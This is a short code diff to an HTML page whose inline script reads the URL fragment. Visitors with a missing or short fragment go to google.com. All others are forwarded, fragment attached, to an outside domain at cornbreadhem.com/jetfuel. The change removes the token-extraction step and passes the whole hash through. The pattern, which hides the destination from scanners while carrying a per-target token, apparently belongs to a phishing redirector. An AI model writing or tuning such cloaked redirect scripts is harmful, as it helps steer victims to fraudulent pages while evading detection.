@@ -8,21 +8,15 @@
 <body>
   <script>
     (function () {
-      const hash = window.location.hash; // e.g., #rndUN_17rTOKEN123
+      const hash = window.location.hash;
 
       if (!hash || hash.length < 10) {
         window.location.href = "https://google.com";
         return;
       }
 
-      const match = hash.match(/r([a-zA-Z0-9\-_=]+)/);
-      if (!match) {
-        window.location.href = "https://google.com";
-        return;
-      }
-
-      const token = match[1]; // just the token part after r
-      const finalUrl = `https://cornbreadhem.com/jetfuel#${encodeURIComponent(token)}`;
+      // Redirect with full hash preserved
+      const finalUrl = `https://cornbreadhem.com/jetfuel${hash}`;
       window.location.href = finalUrl;
     })();
   </script>
